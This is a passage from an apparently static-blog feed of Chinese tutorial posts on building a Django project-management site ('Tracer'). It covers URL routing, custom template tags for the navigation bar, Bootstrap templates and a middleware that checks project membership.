class="line">    <span class="keyword">return</span> JsonResponse(result)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WiKi </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>项目的管理</title>
      <link href="/2020/08/02/9%20%E9%A1%B9%E7%9B%AE%E7%9A%84%E7%AE%A1%E7%90%86/"/>
      <url>/2020/08/02/9%20%E9%A1%B9%E7%9B%AE%E7%9A%84%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="9-项目的管理"><a href="#9-项目的管理" class="headerlink" title="9 项目的管理"></a>9 项目的管理</h2><p>项目列表中，每个项目都有a标签，点击进入该项目。</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Django%E5%9B%BE%E7%89%87/%E8%BF%9B%E5%85%A5%E9%A1%B9%E7%9B%AE.jpg"  alt="进入项目"></p><h3 id="9-1建项目的url，进入项目"><a href="#9-1建项目的url，进入项目" class="headerlink" title="9.1建项目的url，进入项目"></a>9.1建项目的url，进入项目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 项目管理</span></span><br><span class="line">url(<span class="string">r'^manage/(?P&lt;project_id&gt;\d+)/'</span>, include([], <span class="literal">None</span>, <span class="literal">None</span>)),</span><br></pre></td></tr></table></figure><h3 id="9-2-重写导航栏为（自定义过滤器register）"><a href="#9-2-重写导航栏为（自定义过滤器register）" class="headerlink" title="9.2 重写导航栏为（自定义过滤器register）"></a>9.2 重写导航栏为（自定义过滤器register）</h3><p>项目展示页面与项目管理页面的导航栏不一致，为了避免代码的冗余，通过自定义的过滤器对导航栏进行判断是否进入项目页面，如果进入项目页面才展示。</p><ul><li><p>在web应用下创建一个名为<code>templatetags</code>的文件夹（文件包名必须是<code>templatetags</code>）</p></li><li><p>在该包下创建名为<code>project.py文件</code>用于存放自定义过滤器register的相关代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.template <span class="keyword">import</span> Library</span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> reverse</span><br><span class="line"><span class="keyword">from</span> web <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">register = Library()</span><br><span class="line"></span><br><span class="line"><span class="meta">@register.inclusion_tag('inclusion/all_project_list.html')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">all_project_list</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="comment"># 1.我创建的所有项目</span></span><br><span class="line">    my_project_list = models.Project.objects.filter(creator=request.tracer.user)</span><br><span class="line">    <span class="comment"># 2.我参与的所有项目</span></span><br><span class="line">    join_project_list = models.ProjectUser.objects.filter(user=request.tracer.user)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">'my'</span>:my_project_list,<span class="string">'join'</span>:join_project_list,<span class="string">'request'</span>:request&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@register.inclusion_tag('inclusion/manage_menu_list.html')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">manage_menu_list</span><span class="params">(request)</span>:</span></span><br><span class="line">    data_list = [</span><br><span class="line">        &#123;<span class="string">'title'</span>:<span class="string">'概览'</span>,<span class="string">'url'</span>:reverse(<span class="string">"dashboard"</span>,kwargs=&#123;<span class="string">'project_id'</span>:request.tracer.project.id&#125;)&#125;,</span><br><span class="line">        &#123;<span class="string">'title'</span>:<span class="string">'问题'</span>,<span class="string">'url'</span>:reverse(<span class="string">"issues"</span>,kwargs=&#123;<span class="string">'project_id'</span>:request.tracer.project.id&#125;)&#125;,</span><br><span class="line">        &#123;<span class="string">'title'</span>:<span class="string">'统计'</span>,<span class="string">'url'</span>:reverse(<span class="string">"statistics"</span>,kwargs=&#123;<span class="string">'project_id'</span>:request.tracer.project.id&#125;)&#125;,</span><br><span class="line">        &#123;<span class="string">'title'</span>:<span class="string">'存储'</span>,<span class="string">'url'</span>:reverse(<span class="string">"file"</span>,kwargs=&#123;<span class="string">'project_id'</span>:request.tracer.project.id&#125;)&#125;,</span><br><span class="line">        &#123;<span class="string">'title'</span>:<span class="string">'wiki'</span>,<span class="string">'url'</span>:reverse(<span class="string">"wiki"</span>,kwargs=&#123;<span class="string">'project_id'</span>:request.tracer.project.id&#125;)&#125;,</span><br><span class="line">        &#123;<span class="string">'title'</span>:<span class="string">'配置'</span>,<span class="string">'url'</span>:reverse(<span class="string">"setting"</span>,kwargs=&#123;<span class="string">'project_id'</span>:request.tracer.project.id&#125;)&#125;,</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> data_list:</span><br><span class="line">        <span class="comment"># item['url']</span></span><br><span class="line">        <span class="comment"># 当前用户访问的url：request.path_info  /manage/6/dashboard/add/xxx</span></span><br><span class="line">        <span class="keyword">if</span> request.path_info.startswith(item[<span class="string">'url'</span>]):</span><br><span class="line">            item[<span class="string">'class'</span>] = <span class="string">'active'</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">'data_list'</span>:data_list&#125;</span><br></pre></td></tr></table></figure></li><li><p>创建对应的相关文件（<code>all_project_list.html</code>  &amp;  <code>manage_menu_list.html</code>）</p></li></ul><p><code>all_project_list.html</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"dropdown active"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">class</span>=<span class="string">"dropdown-toggle"</span> <span class="attr">data-toggle</span>=<span class="string">"dropdown"</span> <span class="attr">role</span>=<span class="string">"button"</span> <span class="attr">aria-haspopup</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">aria-expanded</span>=<span class="string">"false"</span>&gt;</span>项 目 &#123;% if request.tracer.project %&#125;(&#123;&#123; request.tracer.project.name &#125;&#125;)&#123;% endif %&#125;<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"caret"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"dropdown-menu"</span>&gt;</span></span><br><span class="line">        &#123;% if my %&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-align-justify"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> 我创建的项目<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            &#123;% for item in my %&#125;</span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'dashboard' project_id=item.id%&#125;"</span>&gt;</span>&#123;&#123; item.name &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            &#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">role</span>=<span class="string">"separator"</span> <span class="attr">class</span>=<span class="string">"divider"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        &#123;% endif %&#125;</span><br><span class="line">        &#123;% if join %&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-handshake-o"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> 我参与的项目<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            &#123;% for item in join %&#125;</span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'dashboard' project_id=item.project.id%&#125;"</span>&gt;</span>&#123;&#123; item.project.name &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            &#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">role</span>=<span class="string">"separator"</span> <span class="attr">class</span>=<span class="string">"divider"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        &#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'project_list' %&#125;"</span>&gt;</span>所有项目<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>manage_menu_list.html</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for item in data_list %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> &#123;% <span class="attr">if</span> <span class="attr">item.class</span> %&#125;<span class="attr">class</span>=<span class="string">"&#123;&#123; item.class &#125;&#125;"</span> &#123;% <span class="attr">endif</span> %&#125;&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;&#123; item.url &#125;&#125;"</span>&gt;</span>&#123;&#123; item.title &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><ul><li>在导航栏（<code>manage.py</code>）上应用（已经应用，参考项目开发的<code>manage.py</code>代码）</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% load project %&#125; 导入模块</span><br><span class="line">&#123;% all_project_list request %&#125; 引用</span><br><span class="line"></span><br><span class="line">&#123;# 判断是否进入项目 #&#125;</span><br><span class="line">&#123;% if request.tracer.project %&#125;</span><br><span class="line">&#123;% manage_menu_list request %&#125; 引用</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><ul><li><p>修改中间件信息，用于判断项目是我参与的还是我创建的（导航栏显示）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.utils.deprecation <span class="keyword">import</span> MiddlewareMixin</span><br><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> redirect</span><br><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"><span class="keyword">from</span> web <span class="keyword">import</span> models</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tracer</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.user = <span class="literal">None</span></span><br><span class="line">        self.price_policy = <span class="literal">None</span></span><br><span class="line">        self.project = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AuthMiddleware</span><span class="params">(MiddlewareMixin)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_request</span><span class="params">(self, request)</span>:</span></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_view</span><span class="params">(self, request, view, args, kwargs)</span>:</span></span><br><span class="line">        <span class="comment"># 1. 判断url是否是以manage开头,如果是判断项目ID是否是我创建的 or 我参与的</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> request.path_info.startswith(<span class="string">'/manage/'</span>):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="comment"># 2. project_id 是否是我创建 or 我参与的</span></span><br><span class="line">        project_id = kwargs.get(<span class="string">'project_id'</span>)</span><br><span class="line">        <span class="comment"># 是否是我创建的</span></span><br><span class="line">        project_obj = models.Project.objects.filter(creator=request.tracer.user,id = project_id,).first()</span><br><span class="line">        <span class="keyword">if</span> project_obj:</span><br><span class="line">            request.tracer.project = project_obj</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="comment"># 是否是我参与的项目</span></span><br><span class="line">        project_join_obj = models.ProjectUser.objects.filter(user=request.tracer.user,project_id=project_id,).first()</span><br><span class="line">        <span class="keyword">if</span> project_join_obj:</span><br><span class="line">            request.tracer.project = project_join_obj</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">'project_list'</span>)</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 项目的管理 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>项目的开发</title>
      <link href="/2020/08/02/8%20%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%BC%80%E5%8F%91/"/>
      <url>/2020/08/02/8%20%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%BC%80%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<h2 id="8-项目的开发"><a href="#8-项目的开发" class="headerlink" title="8 项目的开发"></a>8 项目的开发</h2><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Django%E5%9B%BE%E7%89%87/%E9%A1%B9%E7%9B%AE.jpg"  alt="项目"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Django%E5%9B%BE%E7%89%87/%E9%A1%B9%E7%9B%AE%E7%9A%84%E5%88%9B%E5%BB%BA.jpg"  alt="项目的创建"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Django%E5%9B%BE%E7%89%87/%E9%A1%B9%E7%9B%AE%E7%9A%84%E6%A0%87%E6%98%9F.jpg"  alt="项目的标星"></p><h3 id="8-1-项目的页面显示"><a href="#8-1-项目的页面显示" class="headerlink" title="8.1 项目的页面显示"></a>8.1 项目的页面显示</h3><p>项目需要登陆才能进入，在中间件设置了限制。</p><p>进入项目后导航栏与主页的导航栏不一致，所以重写母板代码，设置新的导航栏。</p><ul><li>模板准备</li></ul><p><code>manage.html</code>文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&#123;% load static %&#125;</span><br><span class="line">&#123;% load project %&#125;</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;% block title %&#125;&#123;% endblock %&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"&#123;% static 'plugin/bootstrap/css/bootstrap.min.css' %&#125;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"&#123;% static 'plugin/font-awesome/css/font-awesome.min.css' %&#125;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"&#123;% static 'css/manage.css' %&#125;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.navbar-hp</span> &#123;</span></span><br><span class="line">            border-radius: 0;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-class">.error-msg</span> &#123;</span></span><br><span class="line">            color: red;</span><br><span class="line">            position: absolute; &#123;# 绝对定位 #&#125;</span><br><span class="line">            font-size: 13px;    &#123;# 字体大小 #&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    &#123;% block css %&#125;&#123;% endblock %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">"navbar navbar-hp"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container-fluid"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- Brand and toggle get grouped for better mobile display --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"navbar-header"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"navbar-toggle collapsed"</span> <span class="attr">data-toggle</span>=<span class="string">"collapse"</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">data-target</span>=<span class="string">"#bs-example-navbar-collapse-1"</span> <span class="attr">aria-expanded</span>=<span class="string">"false"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"sr-only"</span>&gt;</span>Toggle navigation<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"navbar-brand"</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'project_list' %&#125;"</span>&gt;</span>Tracer平台<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- Collect the nav links, forms, and other content for toggling --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"collapse navbar-collapse"</span> <span class="attr">id</span>=<span class="string">"bs-example-navbar-collapse-1"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"nav navbar-nav"</span>&gt;</span></span><br><span class="line">                &#123;% all_project_list request %&#125;</span><br><span class="line"></span><br><span class="line">                &#123;# 判断是否进入项目 #&#125;</span><br><span class="line">                &#123;% if request.tracer.project %&#125;</span><br><span class="line">                    &#123;% manage_menu_list request %&#125;</span><br><span class="line">                &#123;% endif %&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"nav navbar-nav navbar-right"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>工作台<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>日历<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-bell-o"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-bookmark"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"dropdown"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">class</span>=<span class="string">"dropdown-toggle"</span> <span class="attr">data-toggle</span>=<span class="string">"dropdown"</span> <span class="attr">role</span>=<span class="string">"button"</span> <span class="attr">aria-haspopup</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">                       <span class="attr">aria-expanded</span>=<span class="string">"false"</span>&gt;</span>&#123;&#123; request.tracer.user.username &#125;&#125; <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"caret"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"dropdown-menu"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'index' %&#125;"</span>&gt;</span>官网<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">li</span> <span class="attr">role</span>=<span class="string">"separator"</span> <span class="attr">class</span>=<span class="string">"divider"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'logout' %&#125;"</span>&gt;</span>退 出<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="comment">&lt;!-- /.navbar-collapse --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="comment">&lt;!-- /.container-fluid --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line">&#123;% block content %&#125;&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'js/jquery-3.4.1.min.js' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'plugin/bootstrap/js/bootstrap.min.js' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#123;% block js %&#125;&#123;% endblock %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>项目的前端页面</li></ul><p>使用 Bootstrap 样式，使用对应的模态框</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 